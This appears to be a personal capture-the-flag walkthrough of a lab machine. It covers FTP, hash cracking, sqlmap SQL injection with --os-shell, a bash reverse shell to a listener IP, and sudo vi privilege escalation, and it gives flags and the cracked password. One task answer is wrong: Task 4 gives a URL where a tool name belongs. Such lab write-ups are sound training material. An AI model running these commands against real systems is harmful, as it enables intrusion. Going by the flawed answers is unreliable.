###### Task 1

Besides SSH and HTTP, what other service is hosted on this box?

Using nmap we can enumerate the network:

nmap -sV -sC 10.129.95.174

Results show open ports for 21 ftp, 22 ssh, and 80 http.

###### Task 2

This service can be configured to allow login with any password for specific username. What is that username?

The FTP service can be exploited using the user name anonymous with a blank username. 

###### Task 3

What is the name of the file downloaded over this service?

Logging in via anonymous FTP we can see the file backup.zip

This can be obtained using the command

`get backup.zip`


###### Task 4

What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

http://10.129.95.174/dashboard.php?id

###### Task 5

What is the password for the admin user on the website?

Using zip2john, we uncovered the password hashes for the zip file.
saving those hashes, then using john to crach them revvealed the password for the zip file.

unziping the file reveals the index.php file
enumerating its contents reveals the md5 hash for the admin password. 
![[Pasted image 20241106045424.png]]
using crackstation.com the md5 decrypted to 'qwerty789'

###### Task 6

What option can be passed to sqlmap to try to get command execution via the sql injection?

In sqlmap the --os-shell cmd will spawn a shell

this can be done by exploiting the web servers search function and the admin's cookie once logged in. 
The cookies can be seen using the inspect option on firefox., the construct the sqlmap injection

use the command

`sqlmap -u "http://10.129.95.174/dash`
`board.php?search=any" --cookie="PHPSESSID=gbj468o179li3aued95hbkspkm" --os-shell`
will spawn a os-shell

we can better navigate by spawning our own interactive shell. 

using a bash script:
`bash -c "bash -i >& /dev/tcp/10.10.15.12/4444 0>&1"` will spawn a more stable shell
![[Pasted image 20241106050051.png]]

This will spawn a shell on our netcat listener

navigating through the postgres@vaccine user we will see the user.txt file located in the var/lib/postgresql directory.

enumerating the file will reveal the flag.

user flag: ec9b13ca4d6229cd5cc1e09980965bf7

navigating to the webpage directory with the postgres user we can enumerate the dashboard.php file, the file used to login. 

Here we will see the login fo pg_connect which is the connection to the PostgreSQL database
![[Pasted image 20241106051636.png]]

we can connect using this information to the servers open ssh port using:
`ssh postgres@10.129.193.212`
then logging in with the password 

Using sudo -l we can see that the postgres user has sudo privileges using vi at a given location 
![[Pasted image 20241106052225.png]]

we will run this command and inject a shell. 

We can now run:
`sudo /bin/vi /etc/postgresql/11/main/.pg_hba.conf`

once in vi we can inject a common vi bash shell using:

`:!/bin/bash`

This shell can be found at GTFO bins
https://gtfobins.github.io/gtfobins/vi/#shell

This will give us root access, we can now navigate to /root and enumerate the root.txt file for the flag. 

